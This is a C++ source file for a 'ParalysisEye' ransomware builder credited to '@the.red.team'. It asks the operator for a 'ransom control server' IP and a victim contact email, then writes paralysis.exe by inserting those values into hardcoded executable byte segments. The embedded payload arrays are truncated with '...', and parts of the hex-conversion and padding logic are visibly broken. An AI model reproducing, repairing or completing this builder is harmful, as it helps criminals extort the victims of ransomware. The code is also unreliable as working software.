#include <iostream>
#include <sstream>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <cstdlib>
#include <ctime>
#include <windows.h>
#include <conio.h>
#include <fstream>
#include <direct.h>
#include <tchar.h>
#include <wlanapi.h>
#include <time.h>
#include <streambuf>
#include <vector>
#include <Lmcons.h>
#include <pthread.h>
#include <algorithm>
#include <winsock2.h>

#define NUM_THREADS     1

#pragma comment (lib, "Ws2_32.lib")

using namespace std;

vector<string> hexi;
vector<string> actual;

string targIP;
string emailAddr;

int main()
{
	int ic;
    int ici = 1;
	system("title ParalysisEye Installer ^| Developed By: @the.red.team");
	cout << "********************************************\n";
	cout << "*                                          *\n";
	cout << "*           Paralysis Installer            *\n";
	cout << "*                                          *\n";
	cout << "*       Developed By: @the.red.team        *\n";
	cout << "*                                          *\n";
	cout << "********************************************\n\n";
	stringstream si;
	char ent;
	int filler;
	string chick;
	string input;
	cout << "Enter the IP address of your ransom control server: ";
	cin >> input;
	targIP = input;
	stringstream em;
	char emt;
	cout << "Enter the email address for the victim to contact(< 30 characters): ";
	cin >> emailAddr;
	cout << "\n[!] CONVERTING!";
	static const char* const lut = "0123456789ABCDEF";
    size_t len = input.length();
	
    std::string output;
    output.reserve(2 * len);
    for (size_t i = 0; i < len; ++i)
    {
        const unsigned char c = input[i];
        output.push_back(lut[c >> 4]);
        chick = lut[c >> 4];
        hexi.push_back(chick);
        chick = lut[c & 15];
        hexi.push_back(chick);
        output.push_back(lut[c & 15]);
    }
    cout << "\n\n";
    cout << "BEFORE FILLER                                REQUIRED LENGTH: 30\n";
    cout << "================================================================\n";
    cout << "[STRING] -> " << output << " -> LEN: " << output.length() << endl;
    cout << "[VECTOR] -> ";
    for (int ch = 0; ch < hexi.size(); ch++)
    {
    	cout << hexi[ch];
	}
    cout << " -> LEN: " << hexi.size();
    filler = 30 - output.length();
    for (int hh = 0; hh < filler; hh++)
    {
    	hexi.push_back("00");
	}
    cout << "\n\n";
    cout << "AFTER FILLER                                 REQUIRED LENGTH: 30\n";
    cout << "================================================================\n";
    cout << "[VECTOR] -> ";
    for (int th = 0; th < hexi.size(); th++)
    {
    	cout << hexi[th];
	}
    cout << " -> LEN: " << hexi.size();
    string stork;
    for (int hx = 0; hx < hexi.size(); hx++)
    {
    	stork.push_back(hx);
    	hx++;
    	stork.push_back(hx);
    	//string strpi = "0x" + stork;
    	string strpi = stork;
    	actual.push_back(strpi);
	}

	char yes;
	char da;
	FILE *myfile;
	myfile = fopen("paralysis.exe", "wb");
	//first
	char yea1[] = {0x4d, 0x5a, 0x90...}; // First segment of file before the IP address
	//second
	char yea2[] = {0x0, 0x3a, 0x0...}; // Second segment of file after the IP address before email
	
	char yea3[] = {0x0, 0x0, 0x0...}; // Third segment of file after the email
	
	cout << "\n[!] Creating File\n";
	for (unsigned int l=0; l<sizeof(yea1); l++)
	{
		da = yea1[l];
		putc (da, myfile);
	}
	si << input << endl;
	si >> ent;
	putc (ent, myfile);
	cout << "[!] Adding changes: " << input << endl;
	for (int z=0; z<input.length() - 1; z++)
	{
		//yes = actual[z];
		//si << yes;
		//si << "0x" + hexi[z] + hexi[z + 1] << endl;
		si << input << endl;
		//si << hexi[z];
		//cout << hexi[z];
		//si << hexi[z] << endl;
		si >> ent;
		//cout << ent << endl;
		putc (ent, myfile);
	}
	cout << "[!] WRITING FILLER\n";
	for (int f=0; f<15-input.length(); f++)
	{
		putc ('\0', myfile);
	}

	for (unsigned int t=0; t<sizeof(yea2); t++)
	{
		da = yea2[t];
		putc (da, myfile);
	}
	cout << "Adding more changes: " << emailAddr << endl;
	for (int e=0; e<emailAddr.length() - 1; e++)
	{
		em << emailAddr << endl;
		em >> emt;
		putc (emt, myfile);
	}
	cout << "[!] WRITING SECOND FILLER\n";
	for (int e2=0; e2<37-input.length(); e2++)
	{
		putc ('\0', myfile);
	}
	char dar;
	for (unsigned int ti=0; ti<sizeof(yea3); ti++)
	{
		dar = yea3[ti];
		putc (dar, myfile);
	}

	fclose(myfile);
	cout << "[!] COMPLETE | File saved as: paralysis.exe\n";
	system("pause");
    return 0;
}
